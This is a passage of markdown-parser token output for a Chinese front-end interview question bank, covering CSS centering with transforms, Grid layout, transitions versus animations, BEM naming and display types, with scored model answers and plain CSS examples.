**1：使用css3变形来实现**","task":false,"loose":false,"text":"**1：使用css3变形来实现**","tokens":[{"type":"text","raw":"**1：使用css3变形来实现**","text":"**1：使用css3变形来实现**","tokens":[{"type":"strong","raw":"**1：使用css3变形来实现**","text":"1：使用css3变形来实现","tokens":[{"type":"text","raw":"1：使用css3变形来实现","text":"1：使用css3变形来实现","escaped":false}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"① 使用css3变形的方式实现未知大小的元素在屏幕窗口水平垂直都居中","text":"① 使用css3变形的方式实现未知大小的元素在屏幕窗口水平垂直都居中","tokens":[{"type":"text","raw":"① 使用css3变形的方式实现未知大小的元素在屏幕窗口水平垂直都居中","text":"① 使用css3变形的方式实现未知大小的元素在屏幕窗口水平垂直都居中","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```css\\n  元素{\\n      position:fixed;\\n      left:50%;\\n      top:50%;\\n      transform:translateX(-50%) translateY(-50%);\\n  }\\n```","lang":"css","text":"  元素{\\n      position:fixed;\\n      left:50%;\\n      top:50%;\\n      transform:translateX(-50%) translateY(-50%);\\n  }"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"② 使用css变形的方式来实现未知大小的子元素，在父元素中水平垂直都居中","text":"② 使用css变形的方式来实现未知大小的子元素，在父元素中水平垂直都居中","tokens":[{"type":"text","raw":"② 使用css变形的方式来实现未知大小的子元素，在父元素中水平垂直都居中","text":"② 使用css变形的方式来实现未知大小的子元素，在父元素中水平垂直都居中","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```css\\n  父元素{\\n      position:relative;\\n  }\\n  子元素{\\n      position:absolute;\\n      left:50%;\\n      top:50%;\\n      transform:translate(-50%,-50%);\\n  }\\n```","lang":"css","text":"  父元素{\\n      position:relative;\\n  }\\n  子元素{\\n      position:absolute;\\n      left:50%;\\n      top:50%;\\n      transform:translate(-50%,-50%);\\n  }"},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 28. CSS Grid 布局的基本概念和使用方法是什么？\\n\\n","depth":2,"text":"28. CSS Grid 布局的基本概念和使用方法是什么？","tokens":[{"type":"text","raw":"28. CSS Grid 布局的基本概念和使用方法是什么？","text":"28. CSS Grid 布局的基本概念和使用方法是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **2：** Grid布局的基本概念：\\n  + Grid Container：设置 display: grid 的元素\\n  + Grid Item：Grid Container 的直接子元素\\n  + Grid Line：构成网格结构的分界线\\n  + Grid Track：两条相邻网格线之间的空间\\n  + Grid Cell：网格中的单元格\\n  + Grid Area：任意数量的网格单元格组成的区域\\n\\n- **2：** 基本使用示例：","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **2：** Grid布局的基本概念：\\n  + Grid Container：设置 display: grid 的元素\\n  + Grid Item：Grid Container 的直接子元素\\n  + Grid Line：构成网格结构的分界线\\n  + Grid Track：两条相邻网格线之间的空间\\n  + Grid Cell：网格中的单元格\\n  + Grid Area：任意数量的网格单元格组成的区域\\n\\n","task":false,"loose":true,"text":"**2：** Grid布局的基本概念：\\n+ Grid Container：设置 display: grid 的元素\\n+ Grid Item：Grid Container 的直接子元素\\n+ Grid Line：构成网格结构的分界线\\n+ Grid Track：两条相邻网格线之间的空间\\n+ Grid Cell：网格中的单元格\\n+ Grid Area：任意数量的网格单元格组成的区域\\n","tokens":[{"type":"text","raw":"**2：** Grid布局的基本概念：\\n","text":"**2：** Grid布局的基本概念：","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" Grid布局的基本概念：","text":" Grid布局的基本概念：","escaped":false}]},{"type":"list","raw":"+ Grid Container：设置 display: grid 的元素\\n+ Grid Item：Grid Container 的直接子元素\\n+ Grid Line：构成网格结构的分界线\\n+ Grid Track：两条相邻网格线之间的空间\\n+ Grid Cell：网格中的单元格\\n+ Grid Area：任意数量的网格单元格组成的区域\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ Grid Container：设置 display: grid 的元素\\n","task":false,"loose":false,"text":"Grid Container：设置 display: grid 的元素","tokens":[{"type":"text","raw":"Grid Container：设置 display: grid 的元素","text":"Grid Container：设置 display: grid 的元素","tokens":[{"type":"text","raw":"Grid Container：设置 display: grid 的元素","text":"Grid Container：设置 display: grid 的元素","escaped":false}]}]},{"type":"list_item","raw":"+ Grid Item：Grid Container 的直接子元素\\n","task":false,"loose":false,"text":"Grid Item：Grid Container 的直接子元素","tokens":[{"type":"text","raw":"Grid Item：Grid Container 的直接子元素","text":"Grid Item：Grid Container 的直接子元素","tokens":[{"type":"text","raw":"Grid Item：Grid Container 的直接子元素","text":"Grid Item：Grid Container 的直接子元素","escaped":false}]}]},{"type":"list_item","raw":"+ Grid Line：构成网格结构的分界线\\n","task":false,"loose":false,"text":"Grid Line：构成网格结构的分界线","tokens":[{"type":"text","raw":"Grid Line：构成网格结构的分界线","text":"Grid Line：构成网格结构的分界线","tokens":[{"type":"text","raw":"Grid Line：构成网格结构的分界线","text":"Grid Line：构成网格结构的分界线","escaped":false}]}]},{"type":"list_item","raw":"+ Grid Track：两条相邻网格线之间的空间\\n","task":false,"loose":false,"text":"Grid Track：两条相邻网格线之间的空间","tokens":[{"type":"text","raw":"Grid Track：两条相邻网格线之间的空间","text":"Grid Track：两条相邻网格线之间的空间","tokens":[{"type":"text","raw":"Grid Track：两条相邻网格线之间的空间","text":"Grid Track：两条相邻网格线之间的空间","escaped":false}]}]},{"type":"list_item","raw":"+ Grid Cell：网格中的单元格\\n","task":false,"loose":false,"text":"Grid Cell：网格中的单元格","tokens":[{"type":"text","raw":"Grid Cell：网格中的单元格","text":"Grid Cell：网格中的单元格","tokens":[{"type":"text","raw":"Grid Cell：网格中的单元格","text":"Grid Cell：网格中的单元格","escaped":false}]}]},{"type":"list_item","raw":"+ Grid Area：任意数量的网格单元格组成的区域","task":false,"loose":false,"text":"Grid Area：任意数量的网格单元格组成的区域","tokens":[{"type":"text","raw":"Grid Area：任意数量的网格单元格组成的区域","text":"Grid Area：任意数量的网格单元格组成的区域","tokens":[{"type":"text","raw":"Grid Area：任意数量的网格单元格组成的区域","text":"Grid Area：任意数量的网格单元格组成的区域","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **2：** 基本使用示例：","task":false,"loose":true,"text":"**2：** 基本使用示例：","tokens":[{"type":"text","raw":"**2：** 基本使用示例：","text":"**2：** 基本使用示例：","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 基本使用示例：","text":" 基本使用示例：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```css\\n.container {\\n    display: grid;\\n    /* 定义列的大小和数量 */\\n    grid-template-columns: 100px 100px 100px;\\n    /* 定义行的大小和数量 */\\n    grid-template-rows: 100px 100px;\\n    /* 设置间距 */\\n    gap: 10px;\\n}\\n\\n.item {\\n    /* 指定元素位置 */\\n    grid-column: 1 / 3; /* 从第1条网格线到第3条网格线 */\\n    grid-row: 1 / 2;    /* 从第1条网格线到第2条网格线 */\\n}\\n```","lang":"css","text":".container {\\n    display: grid;\\n    /* 定义列的大小和数量 */\\n    grid-template-columns: 100px 100px 100px;\\n    /* 定义行的大小和数量 */\\n    grid-template-rows: 100px 100px;\\n    /* 设置间距 */\\n    gap: 10px;\\n}\\n\\n.item {\\n    /* 指定元素位置 */\\n    grid-column: 1 / 3; /* 从第1条网格线到第3条网格线 */\\n    grid-row: 1 / 2;    /* 从第1条网格线到第2条网格线 */\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 29. CSS 动画和过渡的区别是什么？如何使用它们？\\n\\n","depth":2,"text":"29. CSS 动画和过渡的区别是什么？如何使用它们？","tokens":[{"type":"text","raw":"29. CSS 动画和过渡的区别是什么？如何使用它们？","text":"29. CSS 动画和过渡的区别是什么？如何使用它们？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（6 分）\\n\\n","depth":4,"text":"解答（6 分）","tokens":[{"type":"text","raw":"解答（6 分）","text":"解答（6 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **2：** 过渡（Transition）：\\n  + 从一个状态到另一个状态的平滑过渡\\n  + 需要触发条件（如hover）\\n  + 只能定义开始和结束状态","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 过渡（Transition）：\\n  + 从一个状态到另一个状态的平滑过渡\\n  + 需要触发条件（如hover）\\n  + 只能定义开始和结束状态","task":false,"loose":false,"text":"**2：** 过渡（Transition）：\\n+ 从一个状态到另一个状态的平滑过渡\\n+ 需要触发条件（如hover）\\n+ 只能定义开始和结束状态","tokens":[{"type":"text","raw":"**2：** 过渡（Transition）：\\n","text":"**2：** 过渡（Transition）：","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 过渡（Transition）：","text":" 过渡（Transition）：","escaped":false}]},{"type":"list","raw":"+ 从一个状态到另一个状态的平滑过渡\\n+ 需要触发条件（如hover）\\n+ 只能定义开始和结束状态","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 从一个状态到另一个状态的平滑过渡\\n","task":false,"loose":false,"text":"从一个状态到另一个状态的平滑过渡","tokens":[{"type":"text","raw":"从一个状态到另一个状态的平滑过渡","text":"从一个状态到另一个状态的平滑过渡","tokens":[{"type":"text","raw":"从一个状态到另一个状态的平滑过渡","text":"从一个状态到另一个状态的平滑过渡","escaped":false}]}]},{"type":"list_item","raw":"+ 需要触发条件（如hover）\\n","task":false,"loose":false,"text":"需要触发条件（如hover）","tokens":[{"type":"text","raw":"需要触发条件（如hover）","text":"需要触发条件（如hover）","tokens":[{"type":"text","raw":"需要触发条件（如hover）","text":"需要触发条件（如hover）","escaped":false}]}]},{"type":"list_item","raw":"+ 只能定义开始和结束状态","task":false,"loose":false,"text":"只能定义开始和结束状态","tokens":[{"type":"text","raw":"只能定义开始和结束状态","text":"只能定义开始和结束状态","tokens":[{"type":"text","raw":"只能定义开始和结束状态","text":"只能定义开始和结束状态","escaped":false}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```css\\n.element {\\n    width: 100px;\\n    transition: width 0.3s ease;\\n}\\n\\n.element:hover {\\n    width: 200px;\\n}\\n```","lang":"css","text":".element {\\n    width: 100px;\\n    transition: width 0.3s ease;\\n}\\n\\n.element:hover {\\n    width: 200px;\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **2：** 动画（Animation）：\\n  + 可以定义多个状态的变化\\n  + 可以循环播放\\n  + 可以自动播放，无需触发条件","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 动画（Animation）：\\n  + 可以定义多个状态的变化\\n  + 可以循环播放\\n  + 可以自动播放，无需触发条件","task":false,"loose":false,"text":"**2：** 动画（Animation）：\\n+ 可以定义多个状态的变化\\n+ 可以循环播放\\n+ 可以自动播放，无需触发条件","tokens":[{"type":"text","raw":"**2：** 动画（Animation）：\\n","text":"**2：** 动画（Animation）：","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 动画（Animation）：","text":" 动画（Animation）：","escaped":false}]},{"type":"list","raw":"+ 可以定义多个状态的变化\\n+ 可以循环播放\\n+ 可以自动播放，无需触发条件","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 可以定义多个状态的变化\\n","task":false,"loose":false,"text":"可以定义多个状态的变化","tokens":[{"type":"text","raw":"可以定义多个状态的变化","text":"可以定义多个状态的变化","tokens":[{"type":"text","raw":"可以定义多个状态的变化","text":"可以定义多个状态的变化","escaped":false}]}]},{"type":"list_item","raw":"+ 可以循环播放\\n","task":false,"loose":false,"text":"可以循环播放","tokens":[{"type":"text","raw":"可以循环播放","text":"可以循环播放","tokens":[{"type":"text","raw":"可以循环播放","text":"可以循环播放","escaped":false}]}]},{"type":"list_item","raw":"+ 可以自动播放，无需触发条件","task":false,"loose":false,"text":"可以自动播放，无需触发条件","tokens":[{"type":"text","raw":"可以自动播放，无需触发条件","text":"可以自动播放，无需触发条件","tokens":[{"type":"text","raw":"可以自动播放，无需触发条件","text":"可以自动播放，无需触发条件","escaped":false}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```css\\n@keyframes slide {\\n    0% {\\n        transform: translateX(0);\\n    }\\n    50% {\\n        transform: translateX(100px);\\n    }\\n    100% {\\n        transform: translateX(0);\\n    }\\n}\\n\\n.element {\\n    animation: slide 2s ease infinite;\\n}\\n```","lang":"css","text":"@keyframes slide {\\n    0% {\\n        transform: translateX(0);\\n    }\\n    50% {\\n        transform: translateX(100px);\\n    }\\n    100% {\\n        transform: translateX(0);\\n    }\\n}\\n\\n.element {\\n    animation: slide 2s ease infinite;\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **2：** 主要区别：\\n  + 触发方式：过渡需要触发条件，动画可以自动播放\\n  + 状态数量：过渡只有开始和结束两个状态，动画可以有多个状态\\n  + 循环播放：动画可以循环播放，过渡不能\\n  + 控制能力：动画的控制能力更强，可以精确控制中间状态","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 主要区别：\\n  + 触发方式：过渡需要触发条件，动画可以自动播放\\n  + 状态数量：过渡只有开始和结束两个状态，动画可以有多个状态\\n  + 循环播放：动画可以循环播放，过渡不能\\n  + 控制能力：动画的控制能力更强，可以精确控制中间状态","task":false,"loose":false,"text":"**2：** 主要区别：\\n+ 触发方式：过渡需要触发条件，动画可以自动播放\\n+ 状态数量：过渡只有开始和结束两个状态，动画可以有多个状态\\n+ 循环播放：动画可以循环播放，过渡不能\\n+ 控制能力：动画的控制能力更强，可以精确控制中间状态","tokens":[{"type":"text","raw":"**2：** 主要区别：\\n","text":"**2：** 主要区别：","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 主要区别：","text":" 主要区别：","escaped":false}]},{"type":"list","raw":"+ 触发方式：过渡需要触发条件，动画可以自动播放\\n+ 状态数量：过渡只有开始和结束两个状态，动画可以有多个状态\\n+ 循环播放：动画可以循环播放，过渡不能\\n+ 控制能力：动画的控制能力更强，可以精确控制中间状态","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 触发方式：过渡需要触发条件，动画可以自动播放\\n","task":false,"loose":false,"text":"触发方式：过渡需要触发条件，动画可以自动播放","tokens":[{"type":"text","raw":"触发方式：过渡需要触发条件，动画可以自动播放","text":"触发方式：过渡需要触发条件，动画可以自动播放","tokens":[{"type":"text","raw":"触发方式：过渡需要触发条件，动画可以自动播放","text":"触发方式：过渡需要触发条件，动画可以自动播放","escaped":false}]}]},{"type":"list_item","raw":"+ 状态数量：过渡只有开始和结束两个状态，动画可以有多个状态\\n","task":false,"loose":false,"text":"状态数量：过渡只有开始和结束两个状态，动画可以有多个状态","tokens":[{"type":"text","raw":"状态数量：过渡只有开始和结束两个状态，动画可以有多个状态","text":"状态数量：过渡只有开始和结束两个状态，动画可以有多个状态","tokens":[{"type":"text","raw":"状态数量：过渡只有开始和结束两个状态，动画可以有多个状态","text":"状态数量：过渡只有开始和结束两个状态，动画可以有多个状态","escaped":false}]}]},{"type":"list_item","raw":"+ 循环播放：动画可以循环播放，过渡不能\\n","task":false,"loose":false,"text":"循环播放：动画可以循环播放，过渡不能","tokens":[{"type":"text","raw":"循环播放：动画可以循环播放，过渡不能","text":"循环播放：动画可以循环播放，过渡不能","tokens":[{"type":"text","raw":"循环播放：动画可以循环播放，过渡不能","text":"循环播放：动画可以循环播放，过渡不能","escaped":false}]}]},{"type":"list_item","raw":"+ 控制能力：动画的控制能力更强，可以精确控制中间状态","task":false,"loose":false,"text":"控制能力：动画的控制能力更强，可以精确控制中间状态","tokens":[{"type":"text","raw":"控制能力：动画的控制能力更强，可以精确控制中间状态","text":"控制能力：动画的控制能力更强，可以精确控制中间状态","tokens":[{"type":"text","raw":"控制能力：动画的控制能力更强，可以精确控制中间状态","text":"控制能力：动画的控制能力更强，可以精确控制中间状态","escaped":false}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 30. CSS 中的 BEM 命名规范是什么？为什么要使用它？\\n\\n","depth":2,"text":"30. CSS 中的 BEM 命名规范是什么？为什么要使用它？","tokens":[{"type":"text","raw":"30. CSS 中的 BEM 命名规范是什么？为什么要使用它？","text":"30. CSS 中的 BEM 命名规范是什么？为什么要使用它？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **2：** BEM 命名规范：\\n  + Block（块）：独立的组件，如 `.button`\\n  + Element（元素）：属于块的一部分，用 `__` 连接，如 `.button__text`\\n  + Modifier（修饰符）：改变块或元素的外观或行为，用 `--` 连接，如 `.button--large`","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** BEM 命名规范：\\n  + Block（块）：独立的组件，如 `.button`\\n  + Element（元素）：属于块的一部分，用 `__` 连接，如 `.button__text`\\n  + Modifier（修饰符）：改变块或元素的外观或行为，用 `--` 连接，如 `.button--large`","task":false,"loose":false,"text":"**2：** BEM 命名规范：\\n+ Block（块）：独立的组件，如 `.button`\\n+ Element（元素）：属于块的一部分，用 `__` 连接，如 `.button__text`\\n+ Modifier（修饰符）：改变块或元素的外观或行为，用 `--` 连接，如 `.button--large`","tokens":[{"type":"text","raw":"**2：** BEM 命名规范：\\n","text":"**2：** BEM 命名规范：","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" BEM 命名规范：","text":" BEM 命名规范：","escaped":false}]},{"type":"list","raw":"+ Block（块）：独立的组件，如 `.button`\\n+ Element（元素）：属于块的一部分，用 `__` 连接，如 `.button__text`\\n+ Modifier（修饰符）：改变块或元素的外观或行为，用 `--` 连接，如 `.button--large`","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ Block（块）：独立的组件，如 `.button`\\n","task":false,"loose":false,"text":"Block（块）：独立的组件，如 `.button`","tokens":[{"type":"text","raw":"Block（块）：独立的组件，如 `.button`","text":"Block（块）：独立的组件，如 `.button`","tokens":[{"type":"text","raw":"Block（块）：独立的组件，如 ","text":"Block（块）：独立的组件，如 ","escaped":false},{"type":"codespan","raw":"`.button`","text":".button"}]}]},{"type":"list_item","raw":"+ Element（元素）：属于块的一部分，用 `__` 连接，如 `.button__text`\\n","task":false,"loose":false,"text":"Element（元素）：属于块的一部分，用 `__` 连接，如 `.button__text`","tokens":[{"type":"text","raw":"Element（元素）：属于块的一部分，用 `__` 连接，如 `.button__text`","text":"Element（元素）：属于块的一部分，用 `__` 连接，如 `.button__text`","tokens":[{"type":"text","raw":"Element（元素）：属于块的一部分，用 ","text":"Element（元素）：属于块的一部分，用 ","escaped":false},{"type":"codespan","raw":"`__`","text":"__"},{"type":"text","raw":" 连接，如 ","text":" 连接，如 ","escaped":false},{"type":"codespan","raw":"`.button__text`","text":".button__text"}]}]},{"type":"list_item","raw":"+ Modifier（修饰符）：改变块或元素的外观或行为，用 `--` 连接，如 `.button--large`","task":false,"loose":false,"text":"Modifier（修饰符）：改变块或元素的外观或行为，用 `--` 连接，如 `.button--large`","tokens":[{"type":"text","raw":"Modifier（修饰符）：改变块或元素的外观或行为，用 `--` 连接，如 `.button--large`","text":"Modifier（修饰符）：改变块或元素的外观或行为，用 `--` 连接，如 `.button--large`","tokens":[{"type":"text","raw":"Modifier（修饰符）：改变块或元素的外观或行为，用 ","text":"Modifier（修饰符）：改变块或元素的外观或行为，用 ","escaped":false},{"type":"codespan","raw":"`--`","text":"--"},{"type":"text","raw":" 连接，如 ","text":" 连接，如 ","escaped":false},{"type":"codespan","raw":"`.button--large`","text":".button--large"}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```css\\n/* Block */\\n.card {\\n    padding: 20px;\\n}\\n\\n/* Element */\\n.card__title {\\n    font-size: 18px;\\n}\\n\\n/* Element */\\n.card__content {\\n    margin-top: 10px;\\n}\\n\\n/* Modifier */\\n.card--featured {\\n    background: #f0f0f0;\\n}\\n```","lang":"css","text":"/* Block */\\n.card {\\n    padding: 20px;\\n}\\n\\n/* Element */\\n.card__title {\\n    font-size: 18px;\\n}\\n\\n/* Element */\\n.card__content {\\n    margin-top: 10px;\\n}\\n\\n/* Modifier */\\n.card--featured {\\n    background: #f0f0f0;\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **2：** 使用BEM的好处：\\n  + 提高代码的可读性和可维护性\\n  + 避免CSS选择器嵌套过深\\n  + 减少命名冲突\\n  + 明确表达组件结构和关系\\n  + 方便团队协作和代码复用","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 使用BEM的好处：\\n  + 提高代码的可读性和可维护性\\n  + 避免CSS选择器嵌套过深\\n  + 减少命名冲突\\n  + 明确表达组件结构和关系\\n  + 方便团队协作和代码复用","task":false,"loose":false,"text":"**2：** 使用BEM的好处：\\n+ 提高代码的可读性和可维护性\\n+ 避免CSS选择器嵌套过深\\n+ 减少命名冲突\\n+ 明确表达组件结构和关系\\n+ 方便团队协作和代码复用","tokens":[{"type":"text","raw":"**2：** 使用BEM的好处：\\n","text":"**2：** 使用BEM的好处：","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 使用BEM的好处：","text":" 使用BEM的好处：","escaped":false}]},{"type":"list","raw":"+ 提高代码的可读性和可维护性\\n+ 避免CSS选择器嵌套过深\\n+ 减少命名冲突\\n+ 明确表达组件结构和关系\\n+ 方便团队协作和代码复用","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 提高代码的可读性和可维护性\\n","task":false,"loose":false,"text":"提高代码的可读性和可维护性","tokens":[{"type":"text","raw":"提高代码的可读性和可维护性","text":"提高代码的可读性和可维护性","tokens":[{"type":"text","raw":"提高代码的可读性和可维护性","text":"提高代码的可读性和可维护性","escaped":false}]}]},{"type":"list_item","raw":"+ 避免CSS选择器嵌套过深\\n","task":false,"loose":false,"text":"避免CSS选择器嵌套过深","tokens":[{"type":"text","raw":"避免CSS选择器嵌套过深","text":"避免CSS选择器嵌套过深","tokens":[{"type":"text","raw":"避免CSS选择器嵌套过深","text":"避免CSS选择器嵌套过深","escaped":false}]}]},{"type":"list_item","raw":"+ 减少命名冲突\\n","task":false,"loose":false,"text":"减少命名冲突","tokens":[{"type":"text","raw":"减少命名冲突","text":"减少命名冲突","tokens":[{"type":"text","raw":"减少命名冲突","text":"减少命名冲突","escaped":false}]}]},{"type":"list_item","raw":"+ 明确表达组件结构和关系\\n","task":false,"loose":false,"text":"明确表达组件结构和关系","tokens":[{"type":"text","raw":"明确表达组件结构和关系","text":"明确表达组件结构和关系","tokens":[{"type":"text","raw":"明确表达组件结构和关系","text":"明确表达组件结构和关系","escaped":false}]}]},{"type":"list_item","raw":"+ 方便团队协作和代码复用","task":false,"loose":false,"text":"方便团队协作和代码复用","tokens":[{"type":"text","raw":"方便团队协作和代码复用","text":"方便团队协作和代码复用","tokens":[{"type":"text","raw":"方便团队协作和代码复用","text":"方便团队协作和代码复用","escaped":false}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 31. display的block、inline和inline-block的区别\\n\\n","depth":2,"text":"31. display的block、inline和inline-block的区别","tokens":[{"type":"text","raw":"31. display的block、inline和inline-block的区别","text":"31. display的block、inline和inline-block的区别","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"block： 会独占一行，多个元素会另起一行，可以设置width、height、margin和padding属性；","text":"block： 会独占一行，多个元素会另起一行，可以设置width、height、margin和padding属性；","tokens":[{"type":"text","raw":"block： 会独占一行，多个元素会另起一行，可以设置width、height、margin和padding属性；","text":"block： 会独占一行，多个元素会另起一行，可以设置width、height、margin和padding属性；","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"inline： 元素不会独占一行，设置width、height属性无效。但可以设置水平方向的margin和padding属性，不能设置垂直方向的padding和margin；","text":"inline： 元素不会独占一行，设置width、height属性无效。但可以设置水平方向的margin和padding属性，不能设置垂直方向的padding和margin；","tokens":[{"type":"text","raw":"inline： 